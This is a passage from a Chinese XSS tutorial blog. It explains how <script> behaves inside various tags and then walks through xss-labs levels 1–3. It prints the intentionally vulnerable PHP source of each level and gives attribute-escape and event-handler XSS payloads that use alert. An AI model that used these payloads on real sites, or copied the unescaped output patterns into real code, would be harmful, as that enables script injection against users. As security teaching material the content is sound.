<li><strong>脚本仍会执行</strong>，但需注意<strong>执行时机</strong>：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;嵌套在 div 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当 HTML 解析到此处时立即执行。</li>
<li>如果容器标签被动态插入（如通过 JS），脚本会在插入时执行。</li>
</ul>
</li>
</ul>
<h4 id="场景-2：表单标签（如-）"><a href="#场景-2：表单标签（如-）" class="headerlink" title="场景 2：表单标签（如 &lt;form&gt;）"></a>场景 2：表单标签（如 <code>&lt;form&gt;</code>）</h4><ul>
<li>脚本正常执行，但可能破坏表单结构：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;表单内的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-3：表格标签（如-、）"><a href="#场景-3：表格标签（如-、）" class="headerlink" title="场景 3：表格标签（如 &lt;table&gt;、&lt;tr&gt;）"></a>场景 3：表格标签（如 <code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>）</h4><ul>
<li>部分浏览器可能因 HTML 解析规则拒绝执行：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;表格内的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 可能不执行 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>应避免将 <code>&lt;script&gt;</code> 直接放在 <code>&lt;table&gt;</code> 或 <code>&lt;tr&gt;</code> 内。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-在特殊标签中的行为"><a href="#3-在特殊标签中的行为" class="headerlink" title="3. &lt;script&gt; 在特殊标签中的行为"></a>3. <code>&lt;script&gt;</code> 在特殊标签中的行为</h3><h4 id="场景-1：-标签"><a href="#场景-1：-标签" class="headerlink" title="场景 1：&lt;noscript&gt; 标签"></a>场景 1：<code>&lt;noscript&gt;</code> 标签</h4><ul>
<li>仅当浏览器<strong>禁用 JavaScript</strong> 时，<code>&lt;noscript&gt;</code> 内的内容会显示：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;不会执行&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>请启用 JavaScript<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>内部的 <code>&lt;script&gt;</code> <strong>永远不会执行</strong>。</li>
</ul>
</li>
</ul>
<h4 id="场景-2：-标签"><a href="#场景-2：-标签" class="headerlink" title="场景 2：&lt;template&gt; 标签"></a>场景 2：<code>&lt;template&gt;</code> 标签</h4><ul>
<li><code>&lt;template&gt;</code> 内的内容被视为<strong>惰性文档片段</strong>，脚本不会执行：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;模板中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>只有当内容被克隆并插入 DOM 后，脚本才会执行。</li>
</ul>
</li>
</ul>
<h4 id="场景-3：SVG-或-MathML-标签"><a href="#场景-3：SVG-或-MathML-标签" class="headerlink" title="场景 3：SVG 或 MathML 标签"></a>场景 3：SVG 或 MathML 标签</h4><ul>
<li>在 SVG&#x2F;MathML 中嵌入 <code>&lt;script&gt;</code>，行为与 HTML 一致：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;SVG 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-动态插入的"><a href="#4-动态插入的" class="headerlink" title="4. 动态插入的 &lt;script&gt;"></a>4. 动态插入的 <code>&lt;script&gt;</code></h3><p>通过 JavaScript 动态创建的 <code>&lt;script&gt;</code> 标签，行为受插入位置影响：</p>
<h4 id="插入到-或-中："><a href="#插入到-或-中：" class="headerlink" title="插入到 &lt;head&gt; 或 &lt;body&gt; 中："></a>插入到 <code>&lt;head&gt;</code> 或 <code>&lt;body&gt;</code> 中：</h4><ul>
<li>脚本异步加载，默认不阻塞页面：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;file.js&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script); <span class="comment">// 或 document.body</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="插入到其他容器中（如-）："><a href="#插入到其他容器中（如-）：" class="headerlink" title="插入到其他容器中（如 &lt;div&gt;）："></a>插入到其他容器中（如 <code>&lt;div&gt;</code>）：</h4><ul>
<li>脚本仍会执行，但可能因容器未渲染而无法操作其内部 DOM：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;script&gt;console.log(&quot;动态脚本&quot;);&lt;\/script&gt;&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="5-XSS-攻击中的-嵌套利用"><a href="#5-XSS-攻击中的-嵌套利用" class="headerlink" title="5. XSS 攻击中的 &lt;script&gt; 嵌套利用"></a>5. XSS 攻击中的 <code>&lt;script&gt;</code> 嵌套利用</h3><p>攻击者可能尝试在非标准位置注入脚本以绕过过滤：</p>
<h4 id="场景-1：属性内的脚本"><a href="#场景-1：属性内的脚本" class="headerlink" title="场景 1：属性内的脚本"></a>场景 1：属性内的脚本</h4><ul>
<li>利用事件属性执行代码（无需 <code>&lt;script&gt;</code> 标签）：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span> <span class="comment">&lt;!-- 通过事件触发 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-2：闭合标签注入"><a href="#场景-2：闭合标签注入" class="headerlink" title="场景 2：闭合标签注入"></a>场景 2：闭合标签注入</h4><ul>
<li>通过闭合父标签提前结束上下文，插入 <code>&lt;script&gt;</code>：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- 闭合原有标签 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="场景-3：利用-HTML-解析特性"><a href="#场景-3：利用-HTML-解析特性" class="headerlink" title="场景 3：利用 HTML 解析特性"></a>场景 3：利用 HTML 解析特性</h4><ul>
<li>某些上下文允许省略闭合标签或特殊字符：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 实际不会执行，因为 &lt;script&gt; 被当作文本内容 --&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h1 id="三、xss-labs解题思路-源码分析"><a href="#三、xss-labs解题思路-源码分析" class="headerlink" title="三、xss-labs解题思路+源码分析"></a>三、xss-labs解题思路+源码分析</h1><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>类型：url类性</p>
<p>解题思路：<br>1.第一个没有任何的输入框，点解图片也没有任何变化<br>2.突破口-&gt;网址栏-&gt;随便输入几次数据观察网页情况<br>3.查看网页源码-&gt;变化化处的标签</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_1.png" class="" title="在这里插入图片描述">

<p>外层标签是h1 文本便签，嵌入script标签的脚本可以发挥作用<br>因此，只需要属于一段完整的脚本即可</p>
<p> 源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level2.php?keyword=test&quot;</span>; </span><br><span class="line"> <span class="comment">//window 在加载完所有元素后，才会执行这个语句  href=&quot;跳转链接&quot;；</span></span><br><span class="line"> <span class="comment">//在level1这一关的网页控制台输入 window.location.href=&quot;level2.php?keyword=test&quot;; 就会跳转至第二关</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];   <span class="comment">//没有进行任何过滤，直接将内容赋值给变量$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于没有任何过滤，只需输入简单的js代码就可以通过,例如：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;GGBOND&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //</span><br><span class="line"></span><br><span class="line">注意：1.不要忘记写上分号 2.探测时最好用字符串探测（可以获取网页回显的信息-&gt;判断是什么类型的防护）</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>类型：输入框类型</p>
<p>解题思路：<br>1.有输入框–&gt;value-&gt;字符逃逸<br>2.输入测试语句-&gt;查看变化处的源码(重点关注value)</p>
<p>测试语句</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alter</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_2.png" class="" title="在这里插入图片描述">
<ul>
<li><p>1.输入的语句没有缺失或者是改变</p>
</li>
<li><p>2.未输入语句时 value&#x3D;” “ ,输入后 有一部分橙色，一部分蓝色 ，一般来说，网页源代码橙色是值，蓝色是标签。</p>
</li>
</ul>
<p>出现这种情况是因为没有闭合，导致标签混乱</p>
<p>解决方法：闭合value</p>
<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="*字符逃逸"></a>*字符逃逸</h3><p>1.仅仅输入 “ ：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_3.png" class="" title="在这里插入图片描述">
<p>闭合了前引号</p>
<p>2.输入 “&gt;</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_4.png" class="" title="在这里插入图片描述">
<p>“ &gt;  逃逸出input标签，下图为此时的页面渲染</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_5.png" class="" title="在这里插入图片描述">

<p>所以只需在之后加上相应的语句即可通关</p>
<p>3.除了逃逸，还可以构造为input的属性 </p>
<p>具体语句在下方源码分析</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level3.php?writing=wait&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];  <span class="comment">//keyword的值就是value的值，即变量$_GET赋值给$str</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;  </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//使用转义函数（经常出现）：htmlspecialchars($str)  将$str的值进行实例化转义   --&gt;之后例子会进一步解释  注意:这里只是对输出的$str进行实例化转义</span></span><br><span class="line"><span class="comment">//htmlspecialchars() 是 PHP 中用于将特殊字符转换为 HTML 实体的函数，其主要作用是防止 XSS（跨站脚本攻击）</span></span><br><span class="line"><span class="comment">//htmlspecialchars() 默认会转义5个字符,其他字符不会转义</span></span><br><span class="line"><span class="comment">//&quot; &#x27; &lt; &gt; &amp;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//注入语句</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;GGBOND&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //    逃逸</span><br><span class="line">&quot; onclick=&#x27;alert(&quot;GGBOND)  //</span><br><span class="line">&quot; onfocus=&#x27;alert(&quot;GGBOND&quot;)  //   </span><br><span class="line">以上需要自主点击输入框</span><br><span class="line">&quot; autofocus=&#x27;alert(&quot;GGBOND&quot;)&#x27; //  </span><br><span class="line">自动点击</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>类型：输入框类型</p>
<p>解题思路：<br>进行初步分析：<br>1.输入测试语句（闭合与不闭合）<br>2.查看网页源码-&gt;value的情况<br>3.选中value的值，右键选中修改html</p>
<p>查看是否被实例化转义（指value的值）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入语句：   &quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_6.png" class="" title="在这里插入图片描述">
<p>查看：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_7.png" class="" title="在这里插入图片描述">

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_8.png" class="" title="在这里插入图片描述">
<p>由上图可知，输入的语句被实例化转义后才作为value的值</p>
<p>在level2输入同样的语句并进行查看value</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_9.png" class="" title="在这里插入图片描述">
<p>value的值没有被实例化转义，这就是level2 与 level3 最大的区别</p>
<p>细节：alert(实例化后的内容);  从这里就可以发现：输入字符串可以获得更多的回显信息</p>
<h3 id="默认Htmlspecialchars-函数"><a href="#默认Htmlspecialchars-函数" class="headerlink" title="*默认Htmlspecialchars()函数"></a>*默认Htmlspecialchars()函数</h3><p>没有转义单引号，可以使用单引号闭合</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">//需要手动点击执行</span><br><span class="line">&#x27; onclick=&#x27;alert(&quot;123&quot;)&#x27; //    不要用双引号包裹，因为双引号会被转义</span><br><span class="line">&#x27; onclick=alert(&quot;123&quot;) //      无引号包裹，仍然可以执行</span><br><span class="line">&#x27; onfocus=console.log(&quot;123&quot;) //   控制台输出</span><br><span class="line">//自动执行</span><br><span class="line">autofocus=alert(&quot;123&quot;) //</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题：为什么不用引号包裹js函数仍然可以执行呢？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：&#x27; onclick=alert(&quot;123&quot;) //  </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_10.png" class="" title="在这里插入图片描述">
<p>浏览器会自动补全引号，即浏览器的容错功能发挥作用</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="comment">//使用实例化转义函数，默认不会转义单引号</span></span><br><span class="line"><span class="comment">//htmlspecialchars($str,ENT_QUOTES)  就会转义单引号</span></span><br><span class="line"><span class="comment">//使用实体转义函数，默认不会转义单引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;      </span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;                                     </span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;	   </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



